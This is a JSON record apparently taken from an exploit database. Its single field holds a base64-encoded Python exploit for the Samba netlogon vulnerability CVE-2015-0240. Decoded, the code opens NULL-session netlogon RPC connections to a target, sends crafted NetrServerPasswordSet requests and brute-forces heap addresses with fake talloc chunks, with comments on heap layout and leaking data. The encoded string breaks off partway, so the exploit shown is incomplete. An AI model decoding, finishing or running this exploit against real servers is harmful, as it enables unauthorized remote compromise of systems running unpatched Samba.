{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9weXRob24NCiIiIg0KRXhwbG9pdCBmb3IgU2FtYmEgdnVsbmVyYWJpbHR5IChDVkUtMjAxNS0wMjQwKSBieSBzbGVlcHlhDQoNClRoZSBleHBsb2l0IG9ubHkgdGFyZ2V0cyB2dWxuZXJhYmxlIHg4NiBzbWJkIDwzLjYuMjQgd2hpY2ggJ2NyZWRzJyBpcyBjb250cm9sbGVkIGJ5IA0KUmVmZXJlbnRJRCBmaWVsZCBvZiBQcmltYXJ5TmFtZSAoU2VydmVyTmFtZSkuIFRoYXQgbWVhbnMgJ190YWxsb2NfemVybygpJw0KaW4gbGlidGFsbG9jIGRvZXMgbm90IHdyaXRlIGEgdmFsdWUgb24gJ2NyZWRzJyBhZGRyZXNzLg0KDQpSZWZlcmVuY2U6DQotIGh0dHBzOi8vc2VjdXJpdHlibG9nLnJlZGhhdC5jb20vMjAxNS8wMi8yMy9zYW1iYS12dWxuZXJhYmlsaXR5LWN2ZS0yMDE1LTAyNDAvDQoNCk5vdGU6DQotIGhlYXAgbWlnaHQgYmUgY2hhbmdlZCB3aGlsZSBydW5uaW5nIGV4cGxvaXQsIG5lZWQgdG8gdHJ5IGFnYWluICh3aXRoICctaHMnIG9yICctcGEnIG9wdGlvbikNCiAgaWYgc29tZXRoaW5nIGZhaWxlZA0KDQpGaW5kIGhlYXAgYWRkcmVzczoNCi0gdWJ1bnR1IFBJRSBoZWFwIHN0YXJ0IHJhbmdlOiBiNzcwMDAwMCAtIGI5ODAwMDAwDQotIHN0YXJ0IHBheWxvYWQgc2l6ZTogdGhlIGJpZ2dlciBpdCBpcyB0aGUgbGVzc2VyIGNvbm5lY3Rpb24gYW5kIGJpbmRpbmcgdGltZS4NCiAgYnV0IG5lZWQgbW9yZSB0aW1lIHRvIHNocmluayBwYXlsb2FkIHNpemUNCi0gcGF5bG9hZCBpcyB0b28gYmlnIHRvIGZpdCBpbiBmcmVlZCBzbWFsbCBob2xlLiBzbyBwYXlsb2FkIGlzIGFsd2F5cyBhdCBlbmQNCiAgb2YgaGVhcA0KLSBzdGFydCBicnV0ZWZvcmNpbmcgaGVhcCBhZGRyZXNzIGZyb20gaGlnaCBtZW1vcnkgYWRkcmVzcyB0byBsb3cgbWVtb3J5IGFkZHJlc3MNCiAgdG8gcHJldmVudCAnY3JlZHMnIHBvaW50ZWQgdG8gcmVhbCBoZWFwIGNodW5rIChhbHNvIG5vIGNyYXNoIGJ1dCBub3Qgb3VyIHBheWxvYWQpDQoNCkxlYWsgaW5mbzoNCi0gaGVhcCBsYXlvdXQgaXMgcHJlZGljdGFibGUgYmVjYXVzZSB0YWxsb2Nfc3RhY2tmcmFtZV9wb29sKDgxOTIpIGlzIGNhbGxlZCBhZnRlciANCiAgYWNjZXB0ZWQgY29ubmVjdGlvbiBhbmQgZm9yayBidXQgYmVmb3JlIGNhbGxpbmcgc21iZF9zZXJ2ZXJfY29ubmVjdGlvbl9sb29wX29uY2UoKQ0KLSBiZWZvcmUgdGFsbG9jX3N0YWNrZnJhbWVfcG9vbCg4MTkyKSBpcyBjYWxsZWQsIHRoZXJlIGFyZSBtYW55IGhvbGVzIGluIGhlYXANCiAgYnV0IHRoZWlyIHNpemUgYXJlIDw4Sy4gc28gcG9vbCBpcyBhdCB0aGUgZW5kIG9mIGhlYXAgYXQgdGhpcyB0aW1lDQotIG1hbnkgZGF0YSB0aGF0IGFsbG9jYXRlZCBhZnRlciB0YWxsb2Nfc3RhY2tmcmFtZV9wb29sKDgxOTIpIGFyZSBhbGxvY2F0ZWQgaW4gcG9vbC4NCiAgd2l0aCB0aGUgc2FtZSBwYXR0ZXJuIG9mIHJlcXVlc3QsIHRoZSBsYXlvdXQgaW4gcG9vbCBhcmUgYWx3YXlzIHRoZSBzYW1lLg0KLSBtYW55IGRhdGEgYXJlIG5vdCBhbGxvY2F0ZWQgaW4gcG9vbCBidXQgZml0IGluIGZyZWUgaG9sZXMuIHNvIG5vIHNtYWxsIHNpemUgZGF0YSBhcmUNCiAgYWxsb2NhdGVkIGFmdGVyIHBvb2wuDQotIG5vcm1hbGx5IHRoZXJlIGFyZSBvbmx5IGZldyBkYXRhIGJsb2NrIGFsbG9jYXRlZCBhZnRlciBwb29sLg0KICAtIHBvb2wgc2l6ZTogMHgyMDQ4IChpbmNsdWRlZCBnbGliYyBoZWFwIGhlYWRlciA0IGJ5dGVzKQ0KICAtIGEgdGFibGUgdGhhdCBjcmVhdGVkIGluIGdpY29udl9vcGVuKCkuIHRoZSBzaXplIGlzIDB4N2Y4OCAoaW5jbHVkZWQgZ2xpYmMgaGVhcCBoZWFkZXIgNCBieXRlcykNCiAgLSBwLT5pbl9kYXRhLnBkdS5kYXRhLiB0aGUgc2l6ZSBpcyAweDEwZTggKGluY2x1ZGVkIGdsaWJjIGhlYXAgaGVhZGVyIDQgYnl0ZXMpDQogICAgLSB0aGlzIG1pZ2h0IG5vdCBiZSBhbGxvY2F0ZWQgaGVyZSBiZWNhdXNlIGl0cyBzaXplIG1pZ2h0IGZpdCBpbiBmcmVlZCBob2xlDQogICAgLSBhbGwgZnJhZ21lbnQgc2hvdWxkIGJlIHNhbWUgc2l6ZSB0byBwcmV2ZW50IHRhbGxvY19yZWFsbG9jKCkgY2hhbmdlZCBwZHUuZGF0YSBzaXplDQogICAgICAtIHNvIGxhc3QgZnJhZ21lbnQgc2hvdWxkIGJlIHBhZGRlZA0KICAtIG5kciBEQVRBX0JMT0IuIHRoZSBzaXplIGlzIDB4MTBkMCAoaW5jbHVkZWQgZ2xpYmMgaGVhcCBoZWFkZXIgNCBieXRlcykNCiAgICAtIHRoaXMgbWlnaHQgbm90IGJlIGFsbG9jYXRlZCBoZXJlIGJlY2F1c2UgaXRzIHNpemUgbWlnaHQgZml0IGluIGZyZWVkIGhvbGUNCiAgLSBwLT5pbl9kYXRhLmRhdGEuZGF0YS4gdGhlIHNpemUgaXMgb3VyIG5ldGxvZ29uIGRhdGENCiAgICAtIGZvciA4SyBwYXlsb2FkLCB0aGUgc2l6ZSBpcyAweDIxNjggKGluY2x1ZGVkIGdsaWJjIGhlYXAgaGVhZGVyIDQgYnl0ZXMpDQogICAgLSB0aGlzIGRhdGEgaXMgYWxsb2NhdGVkIGJ5IHJlYWxsb2MoKSwgZ3JldyBieSBlYWNoIGZyYWdtZW50LiBzbyB0aGlzIG1lbW9yeQ0KICAgICAgYmxvY2sgaXMgbm90IGFsbG9jYXRlZCBieSBtbWFwcGVkIGV2ZW4gdGhlIHNpemUgaXMgdmVyeSBiaWcuDQotIHBvb2wgbGF5b3V0IGZvciBpbnRlcmVzdGVkIGRhdGENCiAgLSByLT5vdXQgb2Zmc2V0IGZyb20gcG9vbCAodGFsbG9jIGhlYWRlcikgaXMgMHgxM2MwDQogICAgLSByLT5vdXQucmV0dXJuX2F1dGhlbnRpY2F0b3Igb2Zmc2V0IGZyb20gcG9vbCBpcyAweDEzYzArMHgxOA0KICAgICAgLSBvdmVyd3JpdGUgdGhpcyAod2l0aCBsaW5rIHVubGluaykgdG8gbGVhayBpbmZvIGluIFNlcnZlclBhc3N3b3JkU2V0IHJlc3BvbnNlDQogIC0gc21iX3JlcXVlc3Qgb2Zmc2V0IGZyb20gcG9vbCAodGFsbG9jIGhlYWRlcikgaXMgMHgxMWEwDQogICAgLSBzbWJfcmVxdWVzdC5zY29ubiBvZmZzZXQgZnJvbSBwb29sIGlzIDB4MTFhMCsweDNjDQogICAgICAtIHNvY2tldCBmZCBpcyBhdCBzbWJfcmVxdWVzdC5zY29ubiBhZGRyZXNzIChmaXJzdCBzdHJ1Y3QgbWVtYmVyKQ0KLSBtb3JlIHNoYXJlZCBmb2xkZXIgaW4gY29uZmlndXJhdGlvbiwgbW9yZSBmcmVlZCBoZWFwIGhvbGVzDQogIC0gb25seSBpZiB0aGVyZSBpcyBubyBvciBvbmUgc2hhcmVkLCBtYW55IGRhdGEgbWlnaHQgYmUgdW5leHBlY3RlZCBhbGxvY2F0ZWQgYWZ0ZXIgcG9vbC4NCiAgICBoYXZlIHRvIGdldCB0aGF0IGV4dHJhIG9mZnNldCBvciBicnV0ZWZvcmNlIGl0DQoNCg0KTW9yZSBleHBsb2l0YXRpb24gZGV0YWlsIGluIGNvZGUgKGNvbW1lbnQpIDspDQoiIiINCg0KaW1wb3J0IHN5cw0KaW1wb3J0IHRpbWUNCmZyb20gc3RydWN0IGltcG9ydCBwYWNrLHVucGFjaw0KaW1wb3J0IGFyZ3BhcnNlDQoNCmltcG9ydCBpbXBhY2tldA0KZnJvbSBpbXBhY2tldC5kY2VycGMudjUgaW1wb3J0IHRyYW5zcG9ydCwgbnJwYw0KZnJvbSBpbXBhY2tldC5kY2VycGMudjUubmRyIGltcG9ydCBORFJDQUxMDQpmcm9tIGltcGFja2V0LmRjZXJwYy52NS5kdHlwZXMgaW1wb3J0IFdTVFINCg0KDQpjbGFzcyBSZXF1ZXN0ZXI6DQogICAgIiIiDQogICAgcHV0IGFsbCBzbWIgcmVxdWVzdCBzdHVmZiBpbnRvIGNsYXNzLiBoZWxwIG15IGVkaXRvciBmb2xkaW5nIHRoZW0NCiAgICAiIiINCiAgICANCiAgICAjIGltcGFja2V0IGRvZXMgbm90IGltcGxlbWVudCBOZXRyU2VydmVyUGFzc3dvcmRTZXQNCiAgICAjIDMuNS40LjQuNiBOZXRyU2VydmVyUGFzc3dvcmRTZXQgKE9wbnVtIDYpDQogICAgY2xhc3MgTmV0clNlcnZlclBhc3N3b3JkU2V0KE5EUkNBTEwpOg0KICAgICAgICBvcG51bSA9IDYNCiAgICAgICAgc3RydWN0dXJlID0gKA0KICAgICAgICAgICAoJ1ByaW1hcnlOYW1lJyxucnBjLlBMT0dPTlNSVl9IQU5ETEUpLA0KICAgICAgICAgICAoJ0FjY291bnROYW1lJyxXU1RSKSwNCiAgICAgICAgICAgKCdTZWN1cmVDaGFubmVsVHlwZScsbnJwYy5ORVRMT0dPTl9TRUNVUkVfQ0hBTk5FTF9UWVBFKSwNCiAgICAgICAgICAgKCdDb21wdXRlck5hbWUnLFdTVFIpLA0KICAgICAgICAgICAoJ0F1dGhlbnRpY2F0b3InLG5ycGMuTkVUTE9HT05fQVVUSEVOVElDQVRPUiksDQogICAgICAgICAgICgnVWFzTmV3UGFzc3dvcmQnLG5ycGMuRU5DUllQVEVEX05UX09XRl9QQVNTV09SRCksDQogICAgICAgICkNCiAgICAjIHJlc3BvbnNlIGlzIGF1dGhlbnRpY2F0b3IgKDggYnl0ZXMpIGFuZCBlcnJvciBjb2RlICg0IGJ5dGVzKQ0KDQogICAgIyBzaXplIG9mIGVhY2ggZmllbGQgaW4gc2VudCBwYWNrZXQNCiAgICByZXFfc2VydmVyX2hhbmRsZV9zaXplID0gMTYNCiAgICByZXFfdXNlcm5hbWVfaGRyX3NpemUgPSA0ICsgNCArIDQgKyAyICMgbWF4IGNvdW50LCBvZmZzZXQsIGFjdHVhbCBjb3VudCwgdHJhaWxpbmcgbnVsbA0KICAgIHJlcV9zZWNfdHlwZV9zaXplID0gMg0KICAgIHJlcV9jb21wdXRlcl9zaXplID0gNCArIDQgKyA0ICsgMg0KICAgIHJlcV9hdXRoZW50aWNhdG9yX3NpemUgPSA4ICsgMiArIDQNCiAgICByZXFfbmV3X3B3ZF9zaXplID0gMTYNCiAgICByZXFfcHJlc2l6ZSA9IHJlcV9zZXJ2ZXJfaGFuZGxlX3NpemUgKyByZXFfdXNlcm5hbWVfaGRyX3NpemUgKyByZXFfc2VjX3R5cGVfc2l6ZSArIHJlcV9jb21wdXRlcl9zaXplICsgcmVxX2F1dGhlbnRpY2F0b3Jfc2l6ZSArIHJlcV9uZXdfcHdkX3NpemUNCiAgICANCiAgICBzYW1iYV9ycGNfZnJhZ21lbnRfc2l6ZSA9IDQyODANCiAgICBuZXRsb2dvbl9kYXRhX2ZyYWdtZW50X3NpemUgPSBzYW1iYV9ycGNfZnJhZ21lbnRfc2l6ZSAtIDggLSAyNCAgIyAyNCBpcyBkY2VycGMgaGVhZGVyIHNpemUNCiAgICANCiAgICBkZWYgX19pbml0X18oc2VsZik6DQogICAgICAgIHNlbGYudGFyZ2V0ID0gTm9uZQ0KICAgICAgICBzZWxmLmRjZSA9IE5vbmUNCiAgICAgICAgDQogICAgICAgIHNlc3Npb25LZXkgPSAnXHgwMCcqMTYNCiAgICAgICAgIyBwcmVwYXJlIFNlcnZlclBhc3N3b3JkU2V0IHJlcXVlc3QNCiAgICAgICAgYXV0aGVudGljYXRvciA9IG5ycGMuTkVUTE9HT05fQVVUSEVOVElDQVRPUigpDQogICAgICAgIGF1dGhlbnRpY2F0b3JbJ0NyZWRlbnRpYWwnXSA9IG5ycGMuQ29tcHV0ZU5ldGxvZ29uQ3JlZGVudGlhbCgnMTIzNDU2NzgnLCBzZXNzaW9uS2V5KQ0KICAgICAgICBhdXRoZW50aWNhdG9yWydUaW1lc3RhbXAnXSA9IDEwDQoNCiAgICAgICAgdWFzTmV3UGFzcyA9IG5ycGMuRU5DUllQVEVEX05UX09XRl9QQVNTV09SRCgpDQogICAgICAgIHVhc05ld1Bhc3NbJ0RhdGEnXSA9ICdceDAwJyoxNg0KDQogICAgICAgIHNlbGYuc2VydmVyTmFtZSA9IG5ycGMuUExPR09OU1JWX0hBTkRMRSgpDQogICAgICAgICMgUmVmZXJlbnRJRCBmaWVsZCBvZiBQcmltYXJ5TmFtZSBjb250cm9scyB0aGUgdW5pbml0aWFsaXplZCB2YWx1ZSBvZiBjcmVkcw0KICAgICAgICBzZWxmLnNlcnZlck5hbWUuZmllbGRzWydSZWZlcmVudElEJ10gPSAwDQogICAgICAgIA0KICAgICAgICBzZWxmLmFjY291bnROYW1lID0gV1NUUigpDQoNCiAgICAgICAgcmVxdWVzdCA9IFJlcXVlc3Rlci5OZXRyU2VydmVyUGFzc3dvcmRTZXQoKQ0KICAgICAgICByZXF1ZXN0WydQcmltYXJ5TmFtZSddID0gc2VsZi5zZXJ2ZXJOYW1lDQogICAgICAgIHJlcXVlc3RbJ0FjY291bnROYW1lJ10gPSBzZWxmLmFjY291bnROYW1lDQogICAgICAgIHJlcXVlc3RbJ1NlY3VyZUNoYW5uZWxUeXBlJ10gPSBucnBjLk5FVExPR09OX1NFQ1VSRV9DSEFOTkVMX1RZUEUuV29ya3N0YXRpb25TZWN1cmVDaGFubmVsDQogICAgICAgIHJlcXVlc3RbJ0NvbXB1dGVyTmFtZSddID0gJ1x4MDAnDQogICAgICAgIHJlcXVlc3RbJ0F1dGhlbnRpY2F0b3InXSA9IGF1dGhlbnRpY2F0b3INCiAgICAgICAgcmVxdWVzdFsnVWFzTmV3UGFzc3dvcmQnXSA9IHVhc05ld1Bhc3MNCiAgICAgICAgc2VsZi5yZXF1ZXN0ID0gcmVxdWVzdA0KICAgIA0KICAgIGRlZiBzZXRfdGFyZ2V0KHNlbGYsIHRhcmdldCk6DQogICAgICAgIHNlbGYudGFyZ2V0ID0gdGFyZ2V0DQogICAgICAgIA0KICAgIGRlZiBzZXRfcGF5bG9hZChzZWxmLCBzLCBwYWRfdG9fc2l6ZT0wKToNCiAgICAgICAgaWYgcGFkX3RvX3NpemUgPiAwOg0KICAgICAgICAgICAgcyArPSAnXHgwMCcqKHBhZF90b19zaXplLWxlbihzKSkNCiAgICAgICAgcGFkX3NpemUgPSAwDQogICAgICAgIGlmIGxlbihzKSA8ICgxNioxMDI0KzEpOg0KICAgICAgICAgICAgb2ZzaXplID0gKGxlbihzKStzZWxmLnJlcV9wcmVzaXplKSAlIHNlbGYubmV0bG9nb25fZGF0YV9mcmFnbWVudF9zaXplDQogICAgICAgICAgICBpZiBvZnNpemUgPiAwOg0KICAgICAgICAgICAgICAgIHBhZF9zaXplID0gc2VsZi5uZXRsb2dvbl9kYXRhX2ZyYWdtZW50X3NpemUgLSBvZnNpemUNCiAgICAgICAgDQogICAgICAgIHNlbGYuYWNjb3VudE5hbWUuZmllbGRzWydEYXRhJ10gPSBzKydceDAwJypwYWRfc2l6ZSsnXHgwMFx4MDAnDQogICAgICAgIHNlbGYuYWNjb3VudE5hbWUuZmllbGRzWydNYXhpbXVtQ291bnQnXSA9IE5vbmUNCiAgICAgICAgc2VsZi5hY2NvdW50TmFtZS5maWVsZHNbJ0FjdHVhbENvdW50J10gPSBOb25lDQogICAgICAgIHNlbGYuYWNjb3VudE5hbWUuZGF0YSA9IE5vbmUgICAgICAgICMgZm9yY2UgcmVjb21wdXRlDQogICAgICAgIA0KICAgIHNldF9hY2NvdW50TmFtZURhdGEgPSBzZXRfcGF5bG9hZA0KDQogICAgZGVmIGdldF9kY2Uoc2VsZik6DQogICAgICAgIGlmIHNlbGYuZGNlIGlzIE5vbmUgb3Igc2VsZi5kY2UubG9zdGNvbm46DQogICAgICAgICAgICBycGN0cmFuc3BvcnQgPSB0cmFuc3BvcnQuRENFUlBDVHJhbnNwb3J0RmFjdG9yeShyJ25jYWNuX25wOiVzW1xQSVBFXG5ldGxvZ29uXScgJSBzZWxmLnRhcmdldCkNCiAgICAgICAgICAgIHJwY3RyYW5zcG9ydC5zZXRfY3JlZGVudGlhbHMoJycsJycpICAjIE5VTEwgc2Vzc2lvbg0KICAgICAgICAgICAgcnBjdHJhbnNwb3J0LnNldF9kcG9ydCg0NDUpDQogICAgICAgICAgICAjIGZvcmNlIHRvICdOVCBMTSAwLjEyJyBvbmx5DQogICAgICAgICAgICBycGN0cmFuc3BvcnQucHJlZmVycmVkX2RpYWxlY3QoJ05UIExNIDAuMTInKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICBzZWxmLmRjZSA9IHJwY3RyYW5zcG9ydC5nZXRfZGNlX3JwYygpDQogICAgICAgICAgICBzZWxmLmRjZS5jb25uZWN0KCkNCiAgICAgICAgICAgIHNlbGYuZGNlLmJpbmQobnJwYy5NU1JQQ19VVUlEX05SUEMpDQogICAgICAgICAgICBzZWxmLmRjZS5sb3N0Y29ubiA9IEZhbHNlDQogICAgICAgIHJldHVybiBzZWxmLmRjZQ0KDQogICAgZGVmIGdldF9zb2NrZXQoc2VsZik6DQogICAgICAgIHJldHVybiBzZWxmLmRjZS5nZXRfcnBjX3RyYW5zcG9ydCgpLmdldF9zb2NrZXQoKQ0KICAgIA0KICAgIGRlZiBmb3JjZV9kY2VfZGlzY29ubmVjdChzZWxmKToNCiAgICAgICAgaWYgbm90IChzZWxmLmRjZSBpcyBOb25lIG9yIHNlbGYuZGNlLmxvc3Rjb25uKToNCiAgICAgICAgICAgIHNlbGYuZ2V0X3NvY2tldCgpLmNsb3NlKCkNCiAgICAgICAgICAgIHNlbGYuZGNlLmxvc3Rjb25uID0gVHJ1ZQ0KDQogICAgZGVmIHJlcXVlc3RfYWRkcihzZWxmLCBhZGRyKToNCiAgICAgICAgc2VsZi5zZXJ2ZXJOYW1lLmZpZWxkc1snUmVmZXJlbnRJRCddID0gYWRkcg0KICAgICAgICANCiAgICAgICAgZGNlID0gc2VsZi5nZXRfZGNlKCkNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgZGNlLmNhbGwoc2VsZi5yZXF1ZXN0Lm9wbnVtLCBzZWxmLnJlcXVlc3QpDQogICAgICAgICAgICBhbnN3ZXIgPSBkY2UucmVjdigpDQogICAgICAgICAgICByZXR1cm4gdW5wYWNrKCI8SUlJSSIsIGFuc3dlcikNCiAgICAgICAgZXhjZXB0IGltcGFja2V0Lm5tYi5OZXRCSU9TRXJyb3IgYXMgZToNCiAgICAgICAgICAgIGlmIGUuYXJnc1swXSAhPSAnRXJyb3Igd2hpbGUgcmVhZGluZyBmcm9tIHJlbW90ZSc6DQogICAgICAgICAgICAgICAgcmFpc2UNCiAgICAgICAgICAgIGRjZS5sb3N0Y29ubiA9IFRydWUNCiAgICAgICAgcmV0dXJuIE5vbmUNCg0KICAgICMgY2FsbCB3aXRoIG5vIHJlYWQNCiAgICBkZWYgY2FsbF9hZGRyKHNlbGYsIGFkZHIpOg0KICAgICAgICBzZWxmLnNlcnZlck5hbWUuZmllbGRzWydSZWZlcmVudElEJ10gPSBhZGRyDQogICAgICAgIA0KICAgICAgICBkY2UgPSBzZWxmLmdldF9kY2UoKQ0KICAgICAgICB0cnk6DQogICAgICAgICAgICBkY2UuY2FsbChzZWxmLnJlcXVlc3Qub3BudW0sIHNlbGYucmVxdWVzdCkNCiAgICAgICAgICAgIHJldHVybiBUcnVlDQogICAgICAgIGV4Y2VwdCBpbXBhY2tldC5ubWIuTmV0QklPU0Vycm9yIGFzIGU6DQogICAgICAgICAgICBpZiBlLmFyZ3NbMF0gIT0gJ0Vycm9yIHdoaWxlIHJlYWRpbmcgZnJvbSByZW1vdGUnOg0KICAgICAgICAgICAgICAgIHJhaXNlDQogICAgICAgICAgICBkY2UubG9zdGNvbm4gPSBUcnVlDQogICAgICAgIHJldHVybiBGYWxzZQ0KICAgIA0KICAgIGRlZiBmb3JjZV9yZWN2KHNlbGYpOg0KICAgICAgICBkY2UgPSBzZWxmLmdldF9kY2UoKQ0KICAgICAgICByZXR1cm4gZGNlLmdldF9ycGNfdHJhbnNwb3J0KCkucmVjdihmb3JjZVJlY3Y9VHJ1ZSkNCg0KICAgIGRlZiByZXF1ZXN0X2NoZWNrX3ZhbGlkX2FkZHIoc2VsZiwgYWRkcik6DQogICAgICAgIGFuc3dlcnMgPSBzZWxmLnJlcXVlc3RfYWRkcihhZGRyKQ0KICAgICAgICBpZiBhbnN3ZXJzIGlzIE5vbmU6DQogICAgICAgICAgICByZXR1cm4gRmFsc2UgIyBjb25uZWN0aW9uIGxvc3QNCiAgICAgICAgZWxpZiBhbnN3ZXJzWzNdICE9IDA6DQogICAgICAgICAgICByZXR1cm4gVHJ1ZSAgIyBlcnJvciwgZXhwZWN0ZWQNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIHJhaXNlIEVycm9yKCdVbmV4cGVjdGVkIHJlc3VsdCcpDQoNCg0KIyB0YWxsb2MgY29uc3RhbnRzDQpUQUxMT0NfTUFHSUMgPSAweGU4MTUwYzcwICAjIGZvciB0YWxsb2MgMi4wDQpUQUxMT0NfRkxBR19GUkVFID0gMHgwMQ0KVEFMTE9DX0ZMQUdfTE9PUCA9IDB4MDINClRBTExPQ19GTEFHX1BPT0wgPSAweDA0DQpUQUxMT0NfRkxBR19QT09MTUVNID0gMHgwOA0KDQpUQUxMT0NfSERSX1NJWkUgPSAweDMwICAjIGZvciAzMiBiaXQNCg0KZmxhZ19sb29wID0gVEFMTE9DX01BR0lDIHwgVEFMTE9DX0ZMQUdfTE9PUCAgIyBmb3IgY2hlY2tpbmcgdmFsaWQgYWRkcmVzcw0KDQojIE5vdGU6IGRvIE5PVCByZWR1Y2UgdGFyZ2V0X3BheWxvYWRfc2l6ZSBsZXNzIHRoYW4gOEtCLiA0S0IgaXMgdG9vIHNtYWxsIGJ1ZmZlci4gY2Fubm90IHByZWRpY3QgYWRkcmVzcy4NClRBUkdFVF9QQVlMT0FEX1NJWkUgPSA4MTkyDQoNCiMjIyMjIyMjDQojIHJlcXVlc3QgaGVscGVyIGZ1bmN0aW9ucw0KIyMjIyMjIyMNCg0KIyBvbmx5IG9uZSBnbG9iYWwgcmVxdWVzdGVyDQpyZXF1ZXN0ZXIgPSBSZXF1ZXN0ZXIoKQ0KDQpkZWYgZm9yY2VfZGNlX2Rpc2Nvbm5lY3QoKToNCiAgICByZXF1ZXN0ZXIuZm9yY2VfZGNlX2Rpc2Nvbm5lY3QoKQ0KDQpkZWYgcmVxdWVzdF9hZGRyKGFkZHIpOg0KICAgIHJldHVybiByZXF1ZXN0ZXIucmVxdWVzdF9hZGRyKGFkZHIpDQoNCmRlZiByZXF1ZXN0X2NoZWNrX3ZhbGlkX2FkZHIoYWRkcik6DQogICAgcmV0dXJuIHJlcXVlc3Rlci5yZXF1ZXN0X2NoZWNrX3ZhbGlkX2FkZHIoYWRkcikNCg0KZGVmIHNldF9wYXlsb2FkKHMsIHBhZF90b19zaXplPTApOg0KICAgIHJlcXVlc3Rlci5zZXRfcGF5bG9hZChzLCBwYWRfdG9fc2l6ZSkNCg0KZGVmIGdldF9zb2NrZXQoKToNCiAgICByZXR1cm4gcmVxdWVzdGVyLmdldF9zb2NrZXQoKQ0KICAgIA0KZGVmIGNhbGxfYWRkcihhZGRyKToNCiAgICByZXR1cm4gcmVxdWVzdGVyLmNhbGxfYWRkcihhZGRyKQ0KDQpkZWYgZm9yY2VfcmVjdigpOg0KICAgIHJldHVybiByZXF1ZXN0ZXIuZm9yY2VfcmVjdigpDQogICAgICAgIA0KIyMjIyMjIyMNCiMgZmluZCBoZWFwIGFkZHJlc3MNCiMjIyMjIyMjDQoNCiMgb25seSByZWZzIE1VU1QgYmUgTlVMTCwgb3RoZXIgbmV2ZXIgYmUgY2hlY2tlZA0KZmFrZV9jaHVua19maW5kX2hlYXAgPSBwYWNrKCI8SUlJSUlJSUkiLA0KICAgIDAsIDAsIDAsIDAsICMgcmVmcw0KICAgIGZsYWdfbG9vcCwgZmxhZ19sb29wLCBmbGFnX2xvb3AsIGZsYWdfbG9vcCwNCikNCg0KZGVmIGZpbmRfdmFsaWRfaGVhcF9hZGRyKHN0YXJ0X2FkZHIsIHN0b3BfYWRkciwgcGF5bG9hZF9zaXplLCBmaXJzdD1GYWxzZSk6DQogICAgIiIiDQogICAgYmVsb3cgY29kZSBjYW4gYmUgdXNlZCBmb3IgY2hlY2tpbmcgdmFsaWQgaGVhcCBhZGRyZXNzIChubyBjcmFzaCkNCg0KICAgIGlmICh1bmxpa2VseSh0Yy0+ZmxhZ3MgJiBUQUxMT0NfRkxBR19MT09QKSkgew0KICAgICAgICAvKiB3ZSBoYXZlIGEgZnJlZSBsb29wIC0gc3RvcCBsb29waW5nICovDQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICAiIiINCiAgICBnbG9iYWwgZmFrZV9jaHVua19maW5kX2hlYXANCiAgICBwYXlsb2FkID0gZmFrZV9jaHVua19maW5kX2hlYXAqKHBheWxvYWRfc2l6ZS9sZW4oZmFrZV9jaHVua19maW5kX2hlYXApKQ0KICAgIHNldF9wYXlsb2FkKHBheWxvYWQpDQogICAgYWRkcl9zdGVwID0gcGF5bG9hZF9zaXplDQogICAgYWRkciA9IHN0YXJ0X2FkZHINCiAgICBpID0gMA0KICAgIHdoaWxlIGFkZHIgPiBzdG9wX2FkZHI6DQogICAgICAgIGlmIGkgPT0gMTY6DQogICAgICAgICAgICBwcmludCgiIFsqXXRyeWluZyBhZGRyOiB7Onh9Ii5mb3JtYXQoYWRkcikpDQogICAgICAgICAgICBpID0gMA0KICAgICAgICANCiAgICAgICAgaWYgcmVxdWVzdF9jaGVja192YWxpZF9hZGRyKGFkZHIpOg0KICAgICAgICAgICAgcmV0dXJuIGFkZHINCiAgICAgICAgaWYgZmlyc3Q6DQogICAgICAgICAgICAjIGZpcnN0IHRpbWUsIHRoZSBsYXN0IDE2IGJpdCBpcyBzdGlsbCBkbyBub3Qga25vdw0KICAgICAgICAgICAgIyBoYXZlIHRvIGRvIGV4dHJhIGNoZWNrDQogICAgICAgICAgICBpZiByZXF1ZXN0X2NoZWNrX3ZhbGlkX2FkZHIoYWRkcisweDEwKToNCiAgICAgICAgICAgICAgICByZXR1cm4gYWRkcisweDEwDQogICAgICAgIGFkZHIgLT0gYWRkcl9zdGVwDQogICAgICAgIGkgKz0gMQ0KICAgIHJldHVybiBOb25lDQoNCmRlZiBmaW5kX3ZhbGlkX2hlYXBfZXhhY3RfYWRkcihhZGRyLCBwYXlsb2FkX3NpemUpOg0KICAgIGdsb2JhbCBmYWtlX2NodW5rX2ZpbmRfaGVhcA0KICAgIGZha2Vfc2l6ZSA9IHBheWxvYWRfc2l6ZSAvLyAyDQogICAgd2hpbGUgZmFrZV9zaXplID49IGxlbihmYWtlX2NodW5rX2ZpbmRfaGVhcCk6DQogICAgICAgIHBheWxvYWQgPSBmYWtlX2NodW5rX2ZpbmRfaGVhcCooZmFrZV9zaXplL2xlbihmYWtlX2NodW5rX2ZpbmRfaGVhcCkpDQogICAgICAgIHNldF9wYXlsb2FkKHBheWxvYWQsIHBheWxvYWRfc2l6ZSkNCiAgICAgICAgaWYgbm90IHJlcXVlc3RfY2hlY2tfdmFsaWRfYWRkcihhZGRyKToNCiAgICAgICAgICAgIGFkZHIgLT0gZmFrZV9zaXplDQogICAgICAgIGZha2Vfc2l6ZSA9IGZha2Vfc2l6ZSAvLyAyDQogICAgDQogICAgc2V0X3BheWxvYWQoJ1x4MDAnKjE2ICsgcGFjaygiPEkiLCBmbGFnX2xvb3ApLCBwYXlsb2FkX3NpemUpDQogICAgIyBiZWNhdXNlIGdsaWJjIGhlYXAgaXMgYWxpZ24gYnkgOA0KICAgICMgc28gdGhlIGxhc3QgNCBiaXQgb2YgYWRkcmVzcyBtdXN0IGJlIDB4NCBvciAweGMNCiAgICBpZiByZXF1ZXN0X2NoZWNrX3ZhbGlkX2FkZHIoYWRkci00KToNCiAgICAgICAgYWRkciAtPSA0DQogICAgZWxpZiByZXF1ZXN0X2NoZWNrX3ZhbGlkX2FkZHIoYWRkci0weGMpOg0KICAgICAgICBhZGRyIC09IDB4Yw0KICAgIGVsc2U6DQogICAgICAgIHByaW50KCIgWy1dIGJhZCBleGFjdCBhZGRyOiB7Onh9Ii5mb3JtYXQoYWRkcikpDQogICAgICAgIHJldHVybiAwDQogICAgDQogICAgcHJpbnQoIiBbKl0gY2hlY2tpbmcgZXhhY3QgYWRkcjogezp4fSIuZm9ybWF0KGFkZHIpKQ0KICAgIA0KICAgIGlmIChhZGRyICYgNCkgPT0gMDoNCiAgICAgICAgcmV0dXJuIDANCiAgICANCiAgICAjIHRlc3QgdGhlIGF